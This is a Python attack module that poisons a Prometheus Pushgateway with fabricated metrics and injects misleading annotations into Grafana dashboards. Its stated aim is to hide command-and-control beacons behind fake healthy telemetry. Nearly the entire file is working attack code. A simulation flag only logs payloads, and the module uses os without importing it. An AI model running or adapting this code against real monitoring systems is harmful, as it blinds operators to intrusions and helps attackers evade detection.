import logging
import time
import random
import json
import requests
from datetime import datetime
from typing import Optional

logger = logging.getLogger("TelemetryInversion")
logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')

FAKE_METRICS = [
    {"metric": "node_cpu_seconds_total", "value": 0.02, "labels": {"mode": "idle"}},
    {"metric": "node_memory_MemAvailable_bytes", "value": 987654321},
    {"metric": "node_load1", "value": 0.1},
    {"metric": "container_fs_usage_bytes", "value": 12345678},
    {"metric": "node_network_transmit_errors_total", "value": 0}
]

REALISTIC_FAKE_METRICS = [
    {"metric": "http_requests_total", "value": 200, "labels": {"method": "GET", "code": "200"}},
    {"metric": "go_threads", "value": 5},
    {"metric": "process_cpu_seconds_total", "value": 0.001},
    {"metric": "node_disk_io_now", "value": 0}
]


def _format_prometheus_metric(m: dict) -> str:
    label_str = ""
    if "labels" in m:
        label_pairs = [f'{k}="{v}"' for k, v in m["labels"].items()]
        label_str = "{" + ",".join(label_pairs) + "}"
    return f"{m['metric']}{label_str} {m['value']}"


def poison_prometheus_exporter(
    push_url: str,
    job: str = "system",
    attack_profile: Optional[list] = None,
    simulation: bool = False,
    delay: float = 1.0,
    iterations: int = 5
):
    """
    Poison a Prometheus Pushgateway endpoint with fabricated metrics.
    """
    logger.info(f"[Inversion] Starting telemetry poison loop: {iterations}x to {push_url}")

    payload = "\n".join(
        _format_prometheus_metric(m)
        for m in (attack_profile or FAKE_METRICS)
    )

    for i in range(iterations):
        if simulation:
            logger.info(f"[SIM] Payload #{i + 1} would push:\n{payload}")
        else:
            try:
                r = requests.post(
                    f"{push_url}/metrics/job/{job}",
                    data=payload,
                    headers={"Content-Type": "text/plain"},
                    timeout=3
                )
                logger.info(f"[Push] Iteration {i+1}: HTTP {r.status_code}")
            except Exception as e:
                logger.error(f"[Push] Failure: {e}")

        time.sleep(delay)


def invert_grafana_dashboard(
    grafana_url: str,
    token: str,
    label: str = "host1",
    value: float = 0.01,
    metric: str = "cpu_idle"
):
    """
    Injects visual noise into Grafana with misleading series data.
    """
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }

    timestamp = int(time.time() * 1000)
    payload = {
        "dashboardId": 1,
        "panelId": random.randint(1, 5),
        "time": timestamp,
        "tags": ["telemetry", "inversion", "stealth"],
        "text": f"Host {label}: {metric} = {value}"
    }

    try:
        r = requests.post(f"{grafana_url}/api/annotations", headers=headers, data=json.dumps(payload))
        if r.status_code == 200:
            logger.info("[Grafana] False annotation injected successfully.")
        else:
            logger.warning(f"[Grafana] Failed with status {r.status_code}")
    except Exception as e:
        logger.error(f"[Grafana] Error injecting annotation: {e}")


def telemetry_inversion_attack(
    prometheus_url: str,
    grafana_url: Optional[str] = None,
    grafana_token: Optional[str] = None,
    job: str = "infra",
    simulation: bool = False,
    telemetry_log: Optional[str] = None
):
    """
    End-to-end telemetry inversion attack:
    - Poison Prometheus metrics
    - Annotate Grafana dashboards with misleading tags
    - Mask C2 beacons with fake healthy data
    """
    logger.info("[Inversion] Initiating full-spectrum telemetry attack")

    poison_prometheus_exporter(
        push_url=prometheus_url,
        job=job,
        attack_profile=REALISTIC_FAKE_METRICS,
        simulation=simulation,
        delay=0.8,
        iterations=6
    )

    if grafana_url and grafana_token:
        for _ in range(3):
            invert_grafana_dashboard(
                grafana_url=grafana_url,
                token=grafana_token,
                label=f"node-{random.randint(100,999)}",
                metric=random.choice(["load_avg", "memory_available", "uptime"]),
                value=round(random.uniform(0.0, 0.1), 3)
            )
            time.sleep(1.1)

    if telemetry_log:
        os.makedirs(os.path.dirname(telemetry_log), exist_ok=True)
        with open(telemetry_log, "a") as f:
            f.write(json.dumps({
                "timestamp": datetime.utcnow().isoformat(),
                "module": "telemetry_inversion",
                "simulation": simulation,
                "grafana": bool(grafana_url),
                "prometheus": prometheus_url
            }) + "\n")

    logger.info("[Inversion] Completed telemetry disruption routine.")
